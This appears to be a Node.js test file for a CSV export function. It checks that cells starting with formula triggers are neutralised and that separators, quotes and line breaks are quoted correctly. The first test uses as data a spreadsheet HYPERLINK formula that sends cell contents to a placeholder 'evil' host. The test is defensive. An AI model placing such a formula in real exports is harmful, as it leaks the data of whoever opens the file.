import { test } from 'node:test';
import assert from 'node:assert/strict';
import { toCSV } from '../static/js/csv.js';

test('neutralises cells a spreadsheet would run as formulas', () => {
  const out = toCSV(['name'], [['=HYPERLINK("http://evil/?"&A1,"x")'], ['+1'], ['-2'], ['@SUM(A1)'], ['\tx']]);
  const lines = out.split('\n').slice(1);
  for (const line of lines) {
    assert.match(line, /^"?'/, `cell not neutralised: ${line}`);
  }
});

test('quotes separators, quotes and line breaks', () => {
  assert.equal(toCSV(['a', 'b'], [['x,y', 'say "hi"'], ['line\r\nbreak', 'ok']]),
    'a,b\n"x,y","say ""hi"""\n"line\r\nbreak",ok');
});

test('leaves ordinary values untouched', () => {
  assert.equal(toCSV(['dn'], [['CN=Alice,OU=Users'], [true], [null]]), 'dn\n"CN=Alice,OU=Users"\ntrue\n');
});
